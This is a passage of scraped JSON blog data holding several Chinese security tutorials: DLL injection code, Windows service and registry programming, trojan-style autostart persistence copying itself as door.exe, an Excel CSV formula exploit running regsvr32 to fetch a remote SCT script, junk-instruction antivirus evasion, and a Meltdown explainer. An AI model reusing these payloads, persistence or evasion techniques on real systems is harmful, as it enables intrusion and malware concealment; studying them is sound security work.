AfxMessageBox(_T(&quot;OK&quot;)); hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLib, (LPTHREAD_START_ROUTINE)pszLibFileRemote, 0, NULL); if (hThread == NULL) &#123; test.Format(_T(&quot;%d&quot;), GetLastError()); AfxMessageBox(test); return FALSE; &#125; AfxMessageBox(_T(&quot;OK&quot;)); WaitForSingleObject(hThread, INFINITE); bRet = TRUE; if (pszLibFileRemote != NULL) &#123; VirtualFreeEx(hProcess, (LPVOID)pszLibFileRemote, 0, MEM_RELEASE); &#125; if (hThread != NULL) &#123; CloseHandle(hThread); &#125; if (hProcess != NULL) &#123; CloseHandle(hProcess); &#125; return bRet;&#125;BOOL WINAPI injectLibA(DWORD pid, PCSTR path) &#123; SIZE_T size = lstrlenA(path); PWSTR pathw = (PWSTR)_alloca(size * sizeof(wchar_t)); StringCchPrintfW(pathw, size, L&quot;%s&quot;, path); return injectLibW(pid, pathw);&#125; 注出1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859BOOL WINAPI unInjectLibW(DWORD pid, PCWSTR path) &#123; BOOL bRet = FALSE; HANDLE hSnapshot = NULL; HANDLE hProcess = NULL, hThead = NULL; hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid); if (hSnapshot == NULL) return FALSE; MODULEENTRY32W me = &#123; sizeof(me) &#125;; BOOL bFound = FALSE; BOOL bMoreMods = Module32FirstW(hSnapshot, &amp;me); for (;bMoreMods;bMoreMods = Module32NextW(hSnapshot, &amp;me)) &#123; bFound = (_wcsicmp(me.szModule, path) == 0 || _wcsicmp(me.szExePath, path) == 0); if (bFound) &#123; break; &#125; &#125; if (!bFound) &#123; AfxMessageBox(L&quot;找到到你要卸载的dll&quot;); return FALSE; &#125; hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid ); PTHREAD_START_ROUTINE psrThread = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(&quot;Kernel32&quot;)), &quot;FreeLibrary&quot;); if (psrThread == NULL) &#123; AfxMessageBox(L&quot;找freelibrary失败&quot;); return FALSE; &#125; hThead = CreateRemoteThread(hProcess, NULL, 0, psrThread, me.modBaseAddr, 0, NULL); if (hThead == NULL) &#123; AfxMessageBox(L&quot;CreateRemoteThread失败&quot;); return FALSE; &#125; WaitForSingleObject(hThead, INFINITE); bRet = TRUE; if (hSnapshot != NULL) &#123; CloseHandle(hSnapshot); &#125; if (hThead != NULL) &#123; CloseHandle(hThead); &#125; if (hProcess != NULL) &#123; CloseHandle(hProcess); &#125; return bRet;&#125;","categories":[],"tags":[{"name":"DLL注入","slug":"DLL注入","permalink":"https://www.giantbranch.cn/tags/DLL注入/"}]},{"title":"调用dll里面的函数的两种方法","slug":"调用dll里面的函数的两种方法","date":"2018-01-21T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/01/21/调用dll里面的函数的两种方法/","link":"","permalink":"https://www.giantbranch.cn/2018/01/21/调用dll里面的函数的两种方法/","excerpt":"","text":"除了有dll，还有.h和.lib文件首先将这三个文件放到代码目录，首先将.h添加到工程（右键添加-现有项） 跟着在你需要用dll的代码文件开头添加 1#include &quot;dll.h&quot; 跟着你就可以尽情调用里面的函数了 假如只有dll文件12345678typedef DWORD(*DEMOW)();HMODULE hlib;hlib = LoadLibrary(TEXT(&quot;dll.dll&quot;));DEMOW Demow = (DEMOW)GetProcAddress(hlib, &quot;DemoW&quot;);Demow();FreeLibrary(hlib); 注意typedef函数指针的定义要与实际的函数的参数一致 加入是两个int参数 1typedef void (*DLLFunc)(int,int);","categories":[],"tags":[{"name":"dll编程","slug":"dll编程","permalink":"https://www.giantbranch.cn/tags/dll编程/"}]},{"title":"Windows服务编程","slug":"Windows服务编程","date":"2018-01-20T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2018/01/20/Windows服务编程/","link":"","permalink":"https://www.giantbranch.cn/2018/01/20/Windows服务编程/","excerpt":"","text":"我们看到有什么360主动防御服务，Google更新服务等，我们也写个简单的服务吧 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#include &lt;stdio.h&gt;#include &lt;windows.h&gt;//毫秒#define SLEEP_TIME 1000#define FILE_PATH &quot;D:\\\\test.txt&quot;//服务状态SERVICE_STATUS m_ServiceState;//服务状态句柄SERVICE_STATUS_HANDLE m_ServiceHandle;void WINAPI ServiceMain(int argc, char** argv);void WINAPI ServiceCtrlHandler(DWORD Opcode);int WriteToLog(char* str);BOOL bRunning;int main() &#123; SERVICE_TABLE_ENTRY stentry[2]; stentry[0].lpServiceName = &quot;demo&quot;; stentry[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)ServiceMain; //服务的最后一项要设置为NULL stentry[1].lpServiceName = NULL; stentry[1].lpServiceProc = NULL; StartServiceCtrlDispatcher(stentry); //system(&quot;pause&quot;); return 0;&#125;//服务主函数void WINAPI ServiceMain(int argc, char** argv) &#123; MEMORYSTATUS memstatus; char str[100]; int availMem; //服务类型和状态 m_ServiceState.dwServiceType = SERVICE_WIN32; m_ServiceState.dwCurrentState = SERVICE_START_PENDING; m_ServiceState.dwControlsAccepted = SERVICE_CONTROL_SHUTDOWN | SERVICE_CONTROL_STOP; m_ServiceState.dwWin32ExitCode = 0; m_ServiceState.dwServiceSpecificExitCode = 0; //下面这两个基本不需要，除非服务启动时间很长 m_ServiceState.dwCheckPoint = 0; m_ServiceState.dwWaitHint = 0; //注册服务控制函数 m_ServiceHandle = RegisterServiceCtrlHandler(&quot;demo&quot;, (LPHANDLER_FUNCTION)ServiceCtrlHandler); if (m_ServiceHandle == NULL) &#123; WriteToLog(&quot;RegisterServiceCtrlHandler failed&quot;); return; &#125; WriteToLog(&quot;RegisterServiceCtrlHandler success&quot;); //更新服务状态 m_ServiceState.dwCurrentState = SERVICE_RUNNING; SetServiceStatus(m_ServiceHandle, &amp;m_ServiceState); memset(str, &apos;\\0&apos;, 100); bRunning = TRUE; while (bRunning) &#123; GlobalMemoryStatus(&amp;memstatus); availMem = memstatus.dwAvailVirtual / 1024 / 1024; sprintf_s(str, 50 ,&quot;available memory is %d MB, use %d %%&quot;, availMem, memstatus.dwMemoryLoad); WriteToLog(str); Sleep(SLEEP_TIME); &#125; WriteToLog(&quot;service stop!&quot;);&#125;//服务控制函数(启动，暂停等)void WINAPI ServiceCtrlHandler(DWORD Opcode) &#123; switch (Opcode) &#123; case SERVICE_CONTROL_STOP: bRunning = FALSE; m_ServiceState.dwCurrentState = SERVICE_STOPPED; break; case SERVICE_CONTROL_SHUTDOWN: bRunning = FALSE; m_ServiceState.dwCurrentState = SERVICE_STOPPED; break; default: break; &#125; SetServiceStatus(m_ServiceHandle, &amp;m_ServiceState);&#125;int WriteToLog(char * str)&#123; FILE* pFile; fopen_s(&amp;pFile, FILE_PATH, &quot;a+&quot;); fprintf_s(pFile, &quot;%s\\n&quot;, str); fclose(pFile); return 0;&#125; 编译并生成后可以用sc命令安装 1sc create giantbranchDemo binpath= D:\\demo.exe 我们再打开服务即可看到 我们可以直接在上面的图形界面启动，也可以sc启动 启动停止与删除命令 123sc start sc stopsc delete 如果程序本身自带启动和删除可以使用下面的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190#include &lt;stdio.h&gt;#include &lt;windows.h&gt;//毫秒#define SLEEP_TIME 1000#define FILE_PATH \"C:\\\\test.txt\"#define SERVICENAME \"practice\"//服务状态SERVICE_STATUS m_ServiceState;//服务状态句柄SERVICE_STATUS_HANDLE m_ServiceHandle;void WINAPI ServiceMain(int argc, char** argv);void WINAPI ServiceCtrlHandler(DWORD Opcode);int WriteToLog(char* str);BOOL InstallService();void DelService();BOOL bRunning;int main(int argc, char** argv[]) &#123; SERVICE_TABLE_ENTRY stentry[2]; if (argc == 2) &#123; if (!strcmp(argv[1], \"-i\")) &#123; InstallService(); &#125;else if (!strcmp(argv[1], \"-d\")) &#123; DelService(); &#125; return 0; &#125; stentry[0].lpServiceName = SERVICENAME; stentry[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)ServiceMain; //服务的最后一项要设置为NULL stentry[1].lpServiceName = NULL; stentry[1].lpServiceProc = NULL; StartServiceCtrlDispatcher(stentry); return 0;&#125;//服务主函数void WINAPI ServiceMain(int argc, char** argv) &#123; MEMORYSTATUS memstatus; char str[100]; int availMem; //服务类型和状态 m_ServiceState.dwServiceType = SERVICE_WIN32; m_ServiceState.dwCurrentState = SERVICE_START_PENDING; m_ServiceState.dwControlsAccepted = SERVICE_CONTROL_SHUTDOWN | SERVICE_CONTROL_STOP; m_ServiceState.dwWin32ExitCode = 0; m_ServiceState.dwServiceSpecificExitCode = 0; //下面这两个基本不需要，除非服务启动时间很长 m_ServiceState.dwCheckPoint = 0; m_ServiceState.dwWaitHint = 0; //注册服务控制函数 m_ServiceHandle = RegisterServiceCtrlHandler(SERVICENAME, (LPHANDLER_FUNCTION)ServiceCtrlHandler); if (m_ServiceHandle == NULL) &#123; WriteToLog(\"RegisterServiceCtrlHandler failed\"); return; &#125; WriteToLog(\"RegisterServiceCtrlHandler success\"); //更新服务状态 m_ServiceState.dwCurrentState = SERVICE_RUNNING; SetServiceStatus(m_ServiceHandle, &amp;m_ServiceState); memset(str, '\\0', 100); bRunning = TRUE; GlobalMemoryStatus(&amp;memstatus); availMem = memstatus.dwAvailVirtual / 1024 / 1024; sprintf_s(str, 50, \"available memory is %d MB, use %d %%\", availMem, memstatus.dwMemoryLoad); WriteToLog(str); WriteToLog(\"service is Running!\");&#125;//服务控制函数(启动，暂停等)void WINAPI ServiceCtrlHandler(DWORD Opcode) &#123; switch (Opcode) &#123; case SERVICE_CONTROL_STOP: case SERVICE_CONTROL_SHUTDOWN: bRunning = FALSE; m_ServiceState.dwWin32ExitCode = 0; m_ServiceState.dwCurrentState = SERVICE_STOPPED; break; default: break; &#125; SetServiceStatus(m_ServiceHandle, &amp;m_ServiceState);&#125;int WriteToLog(char * str)&#123; FILE* pFile; fopen_s(&amp;pFile, FILE_PATH, \"a+\"); fprintf_s(pFile, \"%s\\n\", str); fclose(pFile); return 0;&#125;BOOL InstallService()&#123; char strDir[1024]; SC_HANDLE scHandler,schService; LPCTSTR lpszBinaryPathName; //GetCurrentDirectory(1024, strDir); GetModuleFileName(NULL, strDir, 1024); printf(\"%s\\n\", strDir); lpszBinaryPathName = strDir; scHandler = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); if (scHandler == NULL) &#123; printf(\"open scmanager failed! May be you don't have the privilage?\"); &#125; schService = CreateService(scHandler, SERVICENAME, SERVICENAME, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, lpszBinaryPathName, NULL, NULL, NULL, NULL, NULL ); if (schService == NULL) &#123; printf(\"create service failed~\"); return FALSE; &#125; CloseServiceHandle(schService); CloseServiceHandle(scHandler); return TRUE;&#125;void DelService()&#123; SC_HANDLE scHandler; SC_HANDLE schService; SERVICE_STATUS status; BOOL isSuccess; DWORD errCode; scHandler = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS); if (scHandler == NULL) &#123; printf(\"open scmanager failed! May be you don't have the privilage?\"); return; &#125; schService = OpenService(scHandler, SERVICENAME, SC_MANAGER_ALL_ACCESS | DELETE); if (schService == NULL) &#123; errCode = GetLastError(); printf(\"OpenService failed! code：%d\\n\", errCode); return; &#125; isSuccess = QueryServiceStatus(schService, &amp;status); if (!isSuccess) &#123; printf(\"QueryServiceStatus failed!\"); return; &#125; if (status.dwCurrentState != SERVICE_STOPPED) &#123; isSuccess = ControlService(schService, SERVICE_CONTROL_STOP, &amp;status); if (!isSuccess) &#123; printf(\"Stop Service failed!\"); return; &#125; &#125; isSuccess = DeleteService(schService); if (!isSuccess) &#123; printf(\"DeleteService failed\"); return; &#125; else &#123; printf(\"DeleteService success\"); &#125; CloseServiceHandle(scHandler); CloseServiceHandle(schService);&#125;","categories":[],"tags":[{"name":"C++","slug":"C","permalink":"https://www.giantbranch.cn/tags/C/"},{"name":"服务编程","slug":"服务编程","permalink":"https://www.giantbranch.cn/tags/服务编程/"}]},{"title":"C++添加开机自启动的代码","slug":"C++添加开机自启动的代码","date":"2018-01-17T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/01/17/C++添加开机自启动的代码/","link":"","permalink":"https://www.giantbranch.cn/2018/01/17/C++添加开机自启动的代码/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;string.h&gt;int main() &#123; char regname[] = &quot;SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;; TCHAR path[] = &quot;C:\\\\Windows\\\\System32\\\\door.exe&quot;; HKEY hKey; int ret; ret = RegOpenKey(HKEY_LOCAL_MACHINE, regname, &amp;hKey); ret = RegSetValueEx(hKey, &quot;door&quot;, 0, REG_EXPAND_SZ, (unsigned char *)path, strlen(path)); if (ret == ERROR_SUCCESS) &#123; printf(&quot;success to write run key\\n&quot;); RegCloseKey(hKey); &#125; else &#123; printf(&quot;fail to set value. %d\\n&quot;, ret); system(&quot;pause&quot;); return 0; &#125; char modlepath[256]; char syspath[256]; GetModuleFileName(NULL, modlepath, 256); //printf(&quot;%s\\n&quot;, modlepath); GetSystemDirectory(syspath, 256); //printf(&quot;syspath：%s\\n&quot;, syspath); ret = CopyFile(modlepath, strcat(syspath, &quot;\\\\door.exe&quot;), 1); if (true) &#123; printf(&quot;%s has been copy to %s&quot;, modlepath, syspath); &#125; else &#123; printf(&quot;the file is exist&quot;); &#125; //system(&quot;pause&quot;); return 0;&#125; 效果","categories":[],"tags":[{"name":"开机自启动","slug":"开机自启动","permalink":"https://www.giantbranch.cn/tags/开机自启动/"},{"name":"编程","slug":"编程","permalink":"https://www.giantbranch.cn/tags/编程/"},{"name":"木马","slug":"木马","permalink":"https://www.giantbranch.cn/tags/木马/"}]},{"title":"Microsoft Excel CSV 文件代码执行","slug":"Microsoft Excel CSV 文件代码执行","date":"2018-01-17T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2018/01/17/Microsoft Excel CSV 文件代码执行/","link":"","permalink":"https://www.giantbranch.cn/2018/01/17/Microsoft Excel CSV 文件代码执行/","excerpt":"","text":"在推特上看到这个攻击，在execl2017测试了一下在virustotal的评论上说是THOR APT Scanner捕获到的 利用代码1fillerText1,fillerText2,fillerText3,=MSEXCEL|&apos;\\..\\..\\..\\Windows\\System32\\regsvr32 /s /n /u /i:http://RemoteIPAddress/SCTLauncher.sct scrobj.dll&apos;!&apos;&apos; 简析因为execl遇到等号就是公式开始的地方，继而执行后面的代码 1regsvr32 /s /n /u /i:http://RemoteIPAddress/SCTLauncher.sct scrobj.dll 其中的参数：silent mode (/s)unregistering (/u)not calling DLL register server (/n)passing the required DLL to load via parameter (/i) scrobj.dll是 Microsoft’s Script Component 运行库，使用这个dll获取并执行Windows Script Component （即sct文件） 而regsvr32 可以绕过AppLocker白名单并执行脚本 测试默认安装的execl会有安全警告（声明），点启用 又以警告 再点击是，就会弹出计算器（360会拦截regsvr32利用攻击） referenceshttps://www.virustotal.com/en/file/34b27a622b1ba26f4c7eb8281e84a60b1d5aabcaa454ab1d83b411c86ffaa800/analysis/https://xorl.wordpress.com/2017/12/11/microsoft-excel-csv-code-execution-injection-method/https://gist.github.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25bahttps://twitter.com/G0ldenGunSec/status/939215702073991168","categories":[],"tags":[{"name":"execl","slug":"execl","permalink":"https://www.giantbranch.cn/tags/execl/"},{"name":"代码执行","slug":"代码执行","permalink":"https://www.giantbranch.cn/tags/代码执行/"}]},{"title":"那些你用的到的C++注册表操作","slug":"那些你用的到的C++注册表操作","date":"2018-01-17T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/01/17/那些你用的到的C++注册表操作/","link":"","permalink":"https://www.giantbranch.cn/2018/01/17/那些你用的到的C++注册表操作/","excerpt":"","text":"获取注册表信息以获取cpu信息为例 123456789101112131415161718192021222324252627282930313233343536long lRet;HKEY hKey;TCHAR tcData[64];DWORD dwSize;lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T(&quot;HARDWARE\\\\DESCRIPTION\\\\System\\\\CentralProcessor\\\\0&quot;), 0, KEY_QUERY_VALUE, &amp;hKey);if (lRet == ERROR_SUCCESS)&#123; lRet = RegQueryValueEx(hKey, _T(&quot;ProcessorNameString&quot;), NULL, NULL, (LPBYTE)tcData, &amp;dwSize ); if (lRet == ERROR_SUCCESS) &#123; SetDlgItemText(IDC_STATIC_CPU, tcData); &#125; else &#123; AfxMessageBox(_T(&quot;RegQueryValueEx failed.&quot;)); &#125;&#125;else&#123; AfxMessageBox(_T(&quot;RegOpenKeyEx failed.&quot;));&#125;RegCloseKey(hKey); 获取的是字符串的方式 12345LONG lValue;RegQueryValue(HKEY_LOCAL_MACHINE, _T(&quot;SOFTWARE\\\\test&quot;), NULL, &amp;lValue);TCHAR *pBuf = new TCHAR[lValue];RegQueryValue(HKEY_LOCAL_MACHINE, _T(&quot;SOFTWARE\\\\test&quot;), pBuf, &amp;lValue);AfxMessageBox(pBuf); 获取的是DWORD数值型的 获取的是DWORD数值型的 123456789HKEY hKey;RegOpenKey(HKEY_LOCAL_MACHINE, _T(&quot;SOFTWARE\\\\test&quot;), &amp;hKey);DWORD dwType;DWORD dwValue;DWORD dwAge;RegQueryValueEx(hKey, _T(&quot;age&quot;), 0, &amp;dwType, (LPBYTE)&amp;dwAge , &amp;dwValue);CString str;str.Format(_T(&quot;age = %d&quot;), dwAge);AfxMessageBox(str); 方式2 1234567891011121314151617181920212223242526272829303132333435363738long lRet;HKEY hKey;DWORD dwAge;DWORD dwSize;lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T(&quot;SOFTWARE\\\\test&quot;), 0, KEY_QUERY_VALUE, &amp;hKey);if (lRet == ERROR_SUCCESS)&#123; lRet = RegQueryValueEx(hKey, _T(&quot;age&quot;), 0, NULL, (LPBYTE)&amp;dwAge, &amp;dwSize ); if (lRet == ERROR_SUCCESS) &#123; CString str; str.Format(_T(&quot;age = %d&quot;), dwAge); AfxMessageBox(str); &#125; else &#123; AfxMessageBox(_T(&quot;RegQueryValueEx failed.&quot;)); &#125;&#125;else&#123; AfxMessageBox(_T(&quot;RegOpenKeyEx failed.&quot;));&#125;RegCloseKey(hKey); 写入注册表12345678910HKEY hKey;//DWORD dw;//RegCreateKeyEx(HKEY_LOCAL_MACHINE, _T(&quot;SOFTWARE\\\\test&quot;), 0, REG_NONE, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_READ, NULL, &amp;hKey, &amp;dw);//RegSetValueEx(hKey,_T(&quot;name&quot;) , 0, REG_SZ, (LPBYTE)_T(&quot;giantbranch&quot;), 22);RegCreateKey(HKEY_LOCAL_MACHINE, _T(&quot;SOFTWARE\\\\test&quot;), &amp;hKey);//增加默认RegSetValue(hKey, NULL, REG_SZ, _T(&quot;giantbranch&quot;), 11);DWORD dwAge = 30;RegSetValueEx(hKey, _T(&quot;age&quot;), 0, REG_DWORD, (CONST BYTE *)&amp;dwAge, 4);RegCloseKey(hKey);","categories":[],"tags":[{"name":"注册表编程","slug":"注册表编程","permalink":"https://www.giantbranch.cn/tags/注册表编程/"}]},{"title":"一些加花软件的花指令收集","slug":"一些加花软件的花指令收集","date":"2018-01-11T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2018/01/11/一些加花软件的花指令收集/","link":"","permalink":"https://www.giantbranch.cn/2018/01/11/一些加花软件的花指令收集/","excerpt":"","text":"破说原创1 1234567891011004124B5 B1 01 mov cl,0x1004124B7 2C 90 sub al,0x90004124B9 95 xchg eax,ebp004124BA 4D dec ebp004124BB 42 inc edx ; ntdll.KiFastSystemCallRet004124BC 40 inc eax004124BD 20C4 and ah,al004124BF 8350 06 6E adc dword ptr ds:[eax+0x6],0x6E004124C3 226A E4 and ch,byte ptr ds:[edx-0x1C]004124C6 B8 70114000 mov eax,test.&lt;ModuleEntryPoint&gt;004124CB FFD0 call eax 破说原创2 1234567891011121314151617181920212223004124B5 55 push ebp004124B6 68 10100000 push 0x1010004124BB 8D90 90906888 lea edx,dword ptr ds:[eax-0x77976F70]004124C1 50 push eax004124C2 8D90 90909000 lea edx,dword ptr ds:[eax+0x909090]004124C8 50 push eax004124C9 6A 00 push 0x0004124CB 90 nop004124CC 90 nop004124CD 90 nop004124CE 90 nop004124CF 90 nop004124D0 90 nop004124D1 90 nop004124D2 58 pop eax ; kernel32.7C817077004124D3 64:A3 0000000&gt;mov dword ptr fs:[0],eax004124D9 58 pop eax ; kernel32.7C817077004124DA 58 pop eax ; kernel32.7C817077004124DB 58 pop eax ; kernel32.7C817077004124DC 58 pop eax ; kernel32.7C817077004124DD 8BE8 mov ebp,eax004124DF B8 70114000 mov eax,test.&lt;ModuleEntryPoint&gt;004124E4 FFE0 jmp eax 双重跳转 1234567891011004124B5 B1 01 mov cl,0x1004124B7 2C 90 sub al,0x90004124B9 95 xchg eax,ebp004124BA 4D dec ebp004124BB 42 inc edx ; ntdll.KiFastSystemCallRet004124BC 40 inc eax004124BD 20C4 and ah,al004124BF 8350 06 6E adc dword ptr ds:[eax+0x6],0x6E004124C3 226A E4 and ch,byte ptr ds:[edx-0x1C]004124C6 ^ 0F84 A4ECFEFF je test.&lt;ModuleEntryPoint&gt;004124CC ^ 0F85 9EECFEFF jnz test.&lt;ModuleEntryPoint&gt; 北斗2.3 1234567004124B5 9C pushfd004124B6 60 pushad004124B7 70 61 jo short test.0041251A004124B9 636B 24 arpl word ptr ds:[ebx+0x24],bp004124BC 40 inc eax004124BD B8 70114000 mov eax,test.&lt;ModuleEntryPoint&gt;004124C2 FFD0 call eax PE Diminisher 1234567890040F4ED 53 push ebx0040F4EE 51 push ecx0040F4EF 52 push edx ; ntdll.KiFastSystemCallRet0040F4F0 56 push esi0040F4F1 57 push edi0040F4F2 55 push ebp0040F4F3 E8 00000000 call test.0040F4F80040F4F8 B8 70114000 mov eax,test.&lt;ModuleEntryPoint&gt;0040F4FD FFD0 call eax 北斗1.1 123456780040F4ED 9C pushfd0040F4EE 60 pushad0040F4EF E8 00000000 call test.0040F4F40040F4F4 5D pop ebp ; kernel32.7C8170770040F4F5 B8 57844000 mov eax,test.004084570040F4FA 2D 50844000 sub eax,test.004084500040F4FF B8 70114000 mov eax,test.&lt;ModuleEntryPoint&gt;0040F504 FFD0 call eax nothing 123450040F4ED 83EC 50 sub esp,0x500040F4F0 60 pushad0040F4F1 68 E8000000 push 0xE80040F4F6 B8 70114000 mov eax,test.&lt;ModuleEntryPoint&gt;0040F4FB FFD0 call eax Crypto-Lock 123456789101112131415161718192021220040F4ED 60 pushad0040F4EE BE 15904000 mov esi,test.004090150040F4F3 8DBE EB7FFFFF lea edi,dword ptr ds:[esi-0x8015]0040F4F9 57 push edi0040F4FA 83CD FF or ebp,-0x10040F4FD EB 10 jmp short test.0040F50F0040F4FF 90 nop0040F500 90 nop0040F501 90 nop0040F502 90 nop0040F503 90 nop0040F504 90 nop0040F505 8A06 mov al,byte ptr ds:[esi]0040F507 46 inc esi0040F508 8807 mov byte ptr ds:[edi],al0040F50A 47 inc edi0040F50B 90 nop0040F50C 90 nop0040F50D 90 nop0040F50E 90 nop0040F50F B8 70114000 mov eax,test.&lt;ModuleEntryPoint&gt;0040F514 FFD0 call eax PowerBasic 7.02 这个有点问题 123456789100040F511 55 push ebp0040F512 8BEC mov ebp,esp0040F514 53 push ebx 0040F515 56 push esi0040F516 57 push edi0040F517 BB 00504000 mov ebx,test.00405000 0040F51C 66:2E:F705 34&gt;test word ptr cs:[0x402034],0x40040F526 0F85 98000000 jnz test.0040F5C40040F52C B8 88884600 mov eax,0x4688880040F531 FFD0 call eax seh12345push 4010cc //地址00401051压入堆栈push dword ptr fs:[0] //fs[0]压入堆栈,执行完成后,fs[0]指向栈顶mov dword ptr fs:[0],esp //构造1个err结构mov esi,0 //简单的赋值语句mov eax,dword ptr ds:[esi] //产生异常","categories":[],"tags":[{"name":"加花","slug":"加花","permalink":"https://www.giantbranch.cn/tags/加花/"},{"name":"免杀","slug":"免杀","permalink":"https://www.giantbranch.cn/tags/免杀/"}]},{"title":"花指令编写基础之——如何让360认为helloworld是木马","slug":"花指令编写基础之——如何让360认为helloworld是木马","date":"2018-01-10T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/01/10/花指令编写基础之——如何让360认为helloworld是木马/","link":"","permalink":"https://www.giantbranch.cn/2018/01/10/花指令编写基础之——如何让360认为helloworld是木马/","excerpt":"","text":"其实这篇文章是讲讲最简单的花指令，这标题是写到后面发现360报木马，所以有此题目。 开始之前首先编写一个简单的hello world程序，并编译 1234567#include &quot;stdio.h&quot;int main(int argc, char const *argv[])&#123; printf(&quot;hello，giantbranch&quot;);&#125; 花指令可以简单理解为欺骗杀软，给分析者增加障碍的指令，但是对程序的运行结果没有影响的指令，比如下面的（高级点的使ida反汇编的时候出错，让破解者无法清楚正确地反汇编程序的内容，迷失方向） 1234push eaxpush ebxpop ebxpop eax 再比如 12sub eax, 1add eax, 1 有时候会在jmp的下一行插入一些干扰ida静态分析的字节，而jmp是刚好跳过这些垃圾字节的 实践指导思想：我们使用od在程序比较后的没有代码的地址编写一些简单花指令，之后跳回真正的入口点（当然我们要将程序的入口点修改为我们的代码的地址） 实践前我们先查下壳（其实这是vs2015编译的） 我们编写如下代码，当然你可以根据自己的需要写出自己的 之后我们通过计算可以知道我们的代码的相对偏移为0x1C5A（这是针对我的程序，只要减去当前程序加载的基址就行了） 当然不要忘记复制到文件中了 最后我们修改程序的入口点（用lordpe比较方便）【注：由于我od打开了这个文件，所以截图是readonly了，所以修改时记得关闭程序，之后你的保存按纽就会点亮】 当然你也可以自己通过工具找到偏移，在用winhex等16进制工具修改 我们看看程序能否正常运行 360马上报毒……（通过这个实验，我们可以知道360会对程序的入口点的汇编代码进行检测，因位壳和混淆过的代码都比较不正常，这也是检测病毒木马有杀错无放过的一种方式） 关闭360先，ok成功运行 我们现在再来查查壳，peid核心扫描是扫不出来的，因为它是基于userdb.txt里面的特征查找的，还是从入口点开始查找的 其实这个还是可以查到的，推荐个工具 后记其实代码加花的初衷是想给人阅读和判断制造障碍，绕过杀软等，但是360宁可错杀也不放过helloworld……","categories":[],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://www.giantbranch.cn/tags/逆向/"},{"name":"花指令","slug":"花指令","permalink":"https://www.giantbranch.cn/tags/花指令/"}]},{"title":"对CPU漏洞Meltdown的理解","slug":"对CPU漏洞Meltdown的理解","date":"2018-01-09T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/01/09/对CPU漏洞Meltdown的理解/","link":"","permalink":"https://www.giantbranch.cn/2018/01/09/对CPU漏洞Meltdown的理解/","excerpt":"","text":"步骤1先获取cached和uncached的读取时间，根据这个两个时间设置一个阀值 下面的代码是循环ESTIMATE_CYCLES次后取读取时间的平均值，再计算阀值 123456789101112131415161718192021222324252627282930#define ESTIMATE_CYCLES 1000000static voidset_cache_hit_threshold(void)&#123; long cached, uncached, i; if (0) &#123; cache_hit_threshold = 80; return; &#125; for (cached = 0, i = 0; i &lt; ESTIMATE_CYCLES; i++) cached += get_access_time(target_array); for (cached = 0, i = 0; i &lt; ESTIMATE_CYCLES; i++) cached += get_access_time(target_array); for (uncached = 0, i = 0; i &lt; ESTIMATE_CYCLES; i++) &#123; _mm_clflush(target_array); uncached += get_access_time(target_array); &#125; cached /= ESTIMATE_CYCLES; uncached /= ESTIMATE_CYCLES; cache_hit_threshold = mysqrt(cached * uncached); printf(\"cached = %ld, uncached = %ld, threshold %d\\n\", cached, uncached, cache_hit_threshold);&#125; 这是某次运行时候计算的结果 cached = 30, uncached = 416, threshold 111 可以看到 uncached的读取实践明显高于cached，我们可以根据有无cached进行推测一些东西 步骤2步骤2是将我们想要读取的值读取到eax（实际是al，编译后查看汇编是movzx eax, byte ptr [rdi]，其中rdi就是我们要读取的addr），这时候重要的操作来了，我们获取到的al只是作为target数组的索引（这里的target即target_array数组），由于推测执行和乱序执行，target+ rax * 4096这个地址的值就被缓存下来了（这是重点） 关键代码 12345678\".rept 300\\n\\t\"\"add $0x141, %%rax\\n\\t\"\".endr\\n\\t\" //这300个指令我试过删掉也是可以的，不影响\"movzx (%[addr]), %%eax\\n\\t\" // 将要泄露的值读取一个byte到eax（这是会权限检查，比较耗资源，而乱序执行和推测执行使得cpu从addr获取到值赋值给eax后，不等待检查结束就执行下面的3条指令）\"shl $12, %%rax\\n\\t\" // 将rax * 4096\"jz 1b\\n\\t\" // 如果是0就跳回开头的循环处了\"movzx (%[target], %%rax, 1), %%rbx\\n\" //之后将target+ rax * 4096给到rbx 为了方便，也贴一下ida看到的汇编代码 123456789101112............（这个add指令共300条）.text:000000000040132A add rax, 141h.text:0000000000401330 add rax, 141h.text:0000000000401336 add rax, 141h.text:000000000040133C add rax, 141h.text:0000000000401342 add rax, 141h.text:0000000000401348 add rax, 141h.text:000000000040134E movzx eax, byte ptr [rdi].text:0000000000401351 shl rax, 0Ch.text:0000000000401355 jz loc_400C46.text:000000000040135B 